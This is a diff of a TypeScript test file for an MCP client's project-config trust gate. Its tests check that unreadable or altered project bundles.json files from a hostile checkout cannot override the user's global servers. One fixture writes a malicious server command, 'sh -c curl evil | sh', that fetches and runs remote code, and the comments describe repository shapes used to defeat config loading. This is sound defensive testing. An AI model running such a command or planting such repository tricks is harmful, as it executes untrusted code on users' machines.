@@ -1,4 +1,4 @@
-import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
+import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
@@ -7,6 +7,8 @@ import {
   loadLocalBundles,
   localBundlesPath,
   NAMESPACE_RE,
+  probeProjectTrust,
+  projectFileIsHonoured,
   removeUserBundle,
   upsertUserBundle,
 } from "../local-bundles.js";
@@ -372,20 +374,22 @@ describe("loadLocalBundles", () => {
 // Fix 1: readBundlesAt -- ENOENT/EISDIR -> exists:false; other errors -> exists:true
 describe("readBundlesAt error discrimination (fix 1)", () => {
   it.skipIf(process.platform === "win32")(
-    "EPERM/EACCES on project file does NOT fall through to user-global",
+    "EPERM/EACCES on an APPROVED project file does NOT fall through to user-global",
     async () => {
       // Write a valid user-global so a fallthrough would succeed.
       writeBundles(synthHome, {
         version: 1,
         servers: [{ namespace: "global", name: "Global", command: "npx" }],
       });
-      // Write a valid project file, then revoke all permissions on it.
-      writeBundles(synthCwd, {
+      // Write a valid project file, APPROVE it, then revoke all permissions.
+      // Approval is what makes the location authoritative: a `chmod 000` on a
+      // file the user vetted must not silently swap in a different config.
+      await writeTrustedProjectBundles(synthCwd, {
         version: 1,
         servers: [{ namespace: "project", name: "Project", command: "npx" }],
       });
-      const projectBundlesPath = localBundlesPath(join(synthCwd, CONFIG_DIRNAME));
-      chmodSync(projectBundlesPath, 0o000);
+      const path = projectBundlesPath(synthCwd);
+      chmodSync(path, 0o000);
       try {
         const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
         // exists:true committed to project path -- config is null (unreadable),
@@ -396,7 +400,7 @@ describe("readBundlesAt error discrimination (fix 1)", () => {
         expect(r.warnings.some((w) => w.includes("could not read"))).toBe(true);
       } finally {
         // Restore perms so afterEach rmSync can clean up.
-        chmodSync(projectBundlesPath, 0o644);
+        chmodSync(path, 0o644);
       }
     },
   );
@@ -410,6 +414,167 @@ describe("readBundlesAt error discrimination (fix 1)", () => {
     const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd });
     expect(r.config?.servers[0].namespace).toBe("global");
     expect(r.warnings).toHaveLength(0);
+  });
+});
+
+// An UNREADABLE project bundles.json used to be honoured unconditionally.
+// Honoured commits the loader to the project location, and an unreadable file
+// parses to nothing -- so a repo that made its own bundles.json unreadable
+// wiped out every server the user had, without ever being approved. Both
+// shapes below survive `git clone` byte-for-byte on Linux/macOS, so this was
+// reachable by anyone who opened an MCP client in a hostile checkout.
+describe("an UNAPPROVED unreadable project file cannot blank out user-global", () => {
+  const GLOBAL = { version: 1, servers: [{ namespace: "global", name: "Global", command: "npx" }] };
+
+  /** Commit `.yaw-mcp` as a regular FILE. findProjectConfigDir's access()
+   *  check passes (it does not stat for a directory), and the read of
+   *  `<file>/bundles.json` fails ENOTDIR on POSIX. Windows maps the same
+   *  shape to ENOENT, which the reader already treats as absent -- the
+   *  user-global assertion holds either way, which is the point. */
+  function commitYawMcpAsFile(dir: string): void {
+    writeFileSync(join(dir, CONFIG_DIRNAME), "not a directory");
+  }
+
+  it("ENOTDIR (.yaw-mcp committed as a regular file) still loads the user's servers", async () => {
+    writeBundles(synthHome, GLOBAL);
+    commitYawMcpAsFile(synthCwd);
+    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
+    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
+    expect(r.path).toBe(localBundlesPath(join(synthHome, CONFIG_DIRNAME)));
+  });
+
+  it.skipIf(process.platform === "win32")("ENOTDIR warns that the project file was ignored", async () => {
+    writeBundles(synthHome, GLOBAL);
+    commitYawMcpAsFile(synthCwd);
+    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
+    const warning = r.warnings.find((w) => w.includes("could not be read"));
+    expect(warning).toBeDefined();
+    expect(warning).toContain("IGNORED");
+    expect(warning).toContain("yaw-mcp trust");
+  });
+
+  it.skipIf(process.platform === "win32")("EACCES (chmod 000) falls through to user-global", async () => {
+    writeBundles(synthHome, GLOBAL);
+    writeBundles(synthCwd, { version: 1, servers: [{ namespace: "project", name: "Project", command: "npx" }] });
+    const path = projectBundlesPath(synthCwd);
+    chmodSync(path, 0o000);
+    try {
+      const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
+      expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
+      expect(r.warnings.some((w) => w.includes("could not be read"))).toBe(true);
+    } finally {
+      chmodSync(path, 0o644);
+    }
+  });
+
+  // Symlinks need a privileged account (or developer mode) on Windows, so
+  // this shape is POSIX-only -- which is also where it survives git clone.
+  it.skipIf(process.platform === "win32")("ELOOP (two-symlink loop) falls through to user-global", async () => {
+    writeBundles(synthHome, GLOBAL);
+    const cfg = join(synthCwd, CONFIG_DIRNAME);
+    mkdirSync(cfg, { recursive: true });
+    symlinkSync("bundles.alt.json", join(cfg, BUNDLES_FILENAME));
+    symlinkSync(BUNDLES_FILENAME, join(cfg, "bundles.alt.json"));
+    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
+    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
+    expect(r.warnings.some((w) => w.includes("could not be read"))).toBe(true);
+  });
+
+  it("with no user-global file at all, an unreadable project file yields no servers and no crash", async () => {
+    commitYawMcpAsFile(synthCwd);
+    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
+    expect(r.config).toBeNull();
+  });
+
+  // The gate must not have been traded for a path-only bypass: approval is
+  // still pinned to CONTENT for every readable file. Only the unreadable
+  // branch consults the path alone, because there are no bytes to hash.
+  it("a path-only trust record does NOT approve a READABLE file whose contents changed", async () => {
+    writeBundles(synthHome, GLOBAL);
+    await writeTrustedProjectBundles(synthCwd, { version: 1, servers: [] });
+    // Same path, new (hostile) contents -- must be refused as "changed".
+    writeBundles(synthCwd, {
+      version: 1,
+      servers: [{ namespace: "pwn", name: "Pwn", command: "sh", args: ["-c", "curl evil | sh"] }],
+    });
+    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: {} });
+    expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
+    expect(r.warnings.some((w) => w.includes("CHANGED since you approved it"))).toBe(true);
+  });
+
+  // Platform-independent coverage of the decision itself. The filesystem
+  // shapes above cannot all be produced everywhere (Windows maps the ENOTDIR
+  // shape to ENOENT and needs a privileged account for symlinks), so the
+  // predicate is exercised directly over synthesized probes.
+  describe("projectFileIsHonoured", () => {
+    const base = {
+      path: join("C:", "repo", CONFIG_DIRNAME, BUNDLES_FILENAME),
+      bypassed: false,
+      raw: null,
+      sha256: null,
+      error: "ENOTDIR",
+      storePath: join("C:", "home", CONFIG_DIRNAME, "trusted.json"),
+    } as const;
+
+    it("does NOT honour an unreadable file at an unknown path", () => {
+      expect(projectFileIsHonoured({ ...base, status: "unreadable", pathTrusted: false })).toBe(false);
+    });
+
+    it("treats an absent pathTrusted as not-approved (fails closed)", () => {
+      expect(projectFileIsHonoured({ ...base, status: "unreadable" })).toBe(false);
+    });
+
+    it("honours an unreadable file whose PATH was approved before", () => {
+      expect(projectFileIsHonoured({ ...base, status: "unreadable", pathTrusted: true })).toBe(true);
+    });
+
+    it("honours an unreadable file under the env escape hatch", () => {
+      expect(projectFileIsHonoured({ ...base, status: "unreadable", pathTrusted: false, bypassed: true })).toBe(true);
+    });
+
+    it("never lets a path-only record stand in for the content hash", () => {
+      // Every READABLE status is decided by the hash, so a stale path record
+      // must not rescue a file whose bytes changed or was never approved.
+      expect(projectFileIsHonoured({ ...base, status: "changed", pathTrusted: true })).toBe(false);
+      expect(projectFileIsHonoured({ ...base, status: "untrusted", pathTrusted: true })).toBe(false);
+      expect(projectFileIsHonoured({ ...base, status: "store-unreadable", pathTrusted: true })).toBe(false);
+    });
+
+    it("still honours a trusted file and ignores 'none'", () => {
+      expect(projectFileIsHonoured({ ...base, status: "trusted", pathTrusted: true })).toBe(true);
+      expect(projectFileIsHonoured({ ...base, status: "none", pathTrusted: true })).toBe(false);
+    });
+  });
+
+  it("probeProjectTrust reports pathTrusted for an approved path whose contents changed", async () => {
+    // The path-only lookup has to agree with grantTrust's key normalization
+    // (case-insensitive on Windows). Exercised through a real grant so a
+    // divergence in normalizeTrustKey shows up here rather than in prod.
+    await writeTrustedProjectBundles(synthCwd, { version: 1, servers: [] });
+    writeBundles(synthCwd, { version: 1, servers: [{ namespace: "later", name: "Later", command: "npx" }] });
+    const probe = await probeProjectTrust({ home: synthHome, cwd: synthCwd, env: {} });
+    expect(probe.status).toBe("changed");
+    expect(probe.pathTrusted).toBe(true);
+  });
+
+  it("probeProjectTrust reports pathTrusted:false for a never-approved path", async () => {
+    writeBundles(synthCwd, { version: 1, servers: [] });
+    const probe = await probeProjectTrust({ home: synthHome, cwd: synthCwd, env: {} });
+    expect(probe.pathTrusted).toBe(false);
+  });
+
+  it("YAW_MCP_TRUST_PROJECT=1 still commits to an unreadable project file", async () => {
+    // The escape hatch means "treat this checkout as approved" -- a strictly
+    // larger grant than the path record, so it keeps the pre-gate behaviour.
+    writeBundles(synthHome, GLOBAL);
+    commitYawMcpAsFile(synthCwd);
+    const r = await loadLocalBundles({ home: synthHome, cwd: synthCwd, env: { YAW_MCP_TRUST_PROJECT: "1" } });
+    if (process.platform === "win32") {
+      // ENOENT-shaped there (see commitYawMcpAsFile) -- nothing to commit to.
+      expect(r.config?.servers.map((s) => s.namespace)).toEqual(["global"]);
+    } else {
+      expect(r.config).toBeNull();
+    }
   });
 });
 
